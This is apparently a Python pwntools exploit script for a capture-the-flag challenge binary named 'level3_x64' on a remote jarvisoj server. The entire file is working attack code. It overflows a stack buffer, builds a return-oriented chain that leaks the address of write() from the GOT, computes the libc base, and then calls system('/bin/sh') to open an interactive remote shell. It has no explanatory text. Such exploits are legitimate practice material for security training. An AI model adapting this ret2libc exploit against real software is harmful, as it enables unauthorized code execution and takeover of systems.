#coding:utf-8

from pwn import *

pwn = remote("pwn2.jarvisoj.com", 9883)
libc = ELF("./libc-2.19.so")
level3_x64 = ELF("./level3_x64")

system_offset = libc.symbols['system']
binsh_offset = 0x00000000017C8C3
write_offset = 0x00000000000EB700
write_got = 0x0000000000600A58
write_plt = 0x0000000004004B0
main = 0x00000000040061A

pop_rdi_ret = 0x00000000004006b3
pop_rsi_ret = 0x00000000004006b1

pwn.recv()

payload  = 'a'*(0x80+8) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(write_got) + p64(0xa) + p64(write_plt) + p64(main)

pwn.send(payload)
write_addr = u64(pwn.recv(8))
baseaddr = write_addr - write_offset
system_addr = baseaddr + system_offset
binsh_addr = baseaddr + binsh_offset

payload = 'a'*(0x80+8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
pwn.recv()
pwn.send(payload)
pwn.interactive()
